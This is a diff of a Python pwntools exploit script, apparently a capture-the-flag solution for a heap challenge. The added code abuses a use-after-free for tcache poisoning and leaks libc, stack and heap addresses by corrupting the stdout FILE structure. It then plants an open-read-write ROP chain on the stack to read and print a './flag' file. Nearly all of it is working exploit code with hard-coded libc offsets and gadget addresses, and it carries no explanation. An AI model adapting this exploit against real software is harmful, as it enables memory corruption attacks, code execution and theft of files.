@@ -28,8 +28,8 @@ i2b = lambda c : str(c).encode()
 uu32 = lambda data : u32(data.ljust(4, b'\x00'))
 uu64 = lambda data : u64(data.ljust(8, b'\x00'))
 def debugPID():
-	lg("p.pid")
-	input()
+	# lg("p.pid")
+	# input()
 	pass
 def cmd(choice):
 	ru(b'Choice: ')
@@ -53,43 +53,68 @@ def gift(idx):
 	ru(b'Please input idx: \n')
 	sl(i2b(idx))
 
-for i in range(9):
-	add(0x68, b"aaa")
+vtable_off = 0x1e94a0
+stdout_off = 0x1ed6a0
+IO_base_off = 0x1ed723
+environ_off = 0x1ef600
+curbrk_off = 0x1ef620
+
+for i in range(10):
+	add(0x80, b"aaa")
+add(0x80, b"./flag\x00\x00")
+add(0x80, b"\n")
 for i in range(7):
 	delete(i)
-gift(7)
-add(0x68, b"aaa")
+gift(8)
+show(8)
+leak = uu64(ru(b"\nDone!", "drop"))
+lg("leak")
+libc_base = leak - 0x1ecbe0
+lg("libc_base")
+# debugPID()
+
 delete(7)
-show(7)
-# leak = uu64(ru(b"\nDone!", "drop"))
-# lg("leak")
+add(0x80, b"aaa")
+delete(8)
+add(0x70, b"aaa")
+add(0x98, p64(0) + p64(0x91) + p64(libc_base + stdout_off))		# 2
+add(0x80, b"aaa")
 
-# add(0x68, )
+debugPID()
+add(0x88, p64(0xfbad1887) + p64(libc_base + IO_base_off)*3 + p64(libc_base + environ_off)*1 + p64(libc_base + curbrk_off + 0x08) *2)
+stack_leak = uu64(rn(8))
+rn(0x20 - 0x08)
+heap_leak = uu64(rn(8))
+lg("stack_leak")
 
-# for i in range(7):
-# 	add(0x68, b"aaa")
-# add(0x68, p64(0xdeadbeef))
+pop_rdi_ret = 0x23b6a + libc_base
+pop_rsi_ret = 0x2601f + libc_base
+pop_rax_ret = 0x36174 + libc_base
+pop_rdx_ret = 0x142c92 + libc_base
+syscall_ret = 0x630a9 + libc_base
+flag_addr = heap_leak - 0x207c0
+buf__addr = heap_leak - 0x20730
 
+orw0 = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rax_ret) + p64(2) + p64(syscall_ret) + p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf__addr)
+orw1 = p64(pop_rdx_ret) + p64(0x100) + p64(pop_rax_ret) + p64(0) + p64(syscall_ret) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf__addr) + p64(pop_rdx_ret) + p64(0x100) + p64(libc_base + l.symbols["write"])
+# lg("len(orw1 + orw2)")
 
+delete(3)
+delete(2)
+add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150 + 0x68))
+# add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150))
+add(0x80, b"aaa")
+add(0x88, orw1)
 
+debugPID()
 
-# for i in range(9):
-# 	add(0x90, b"aaa")
-# for i in range(7):
-# 	delete(i)
-# gift(7)
-# show(7)
-# leak = uu64(ru(b"\nDone!", "drop"))
-# lg("leak")
-# libc_base = leak - 0x1ecbe0
-# lg("libc_base")
-
-# for i in range(9):
-# 	add(0x68, b"aaa")
-# for i in range(7):
-# 	delete(i)
-# delete(9)
-
+delete(3)
+delete(2)
+# add(0x98, p64(0) + p64(0x91) + p64(stack_leak))
+add(0x98, p64(0) + p64(0x91) + p64(stack_leak - 0x150))
+add(0x80, b"aaa")
+debugPID()
+add(0x88, b"A"*8 + p64(0xcafecafe) + orw0)
 
 debugPID()
 irt()
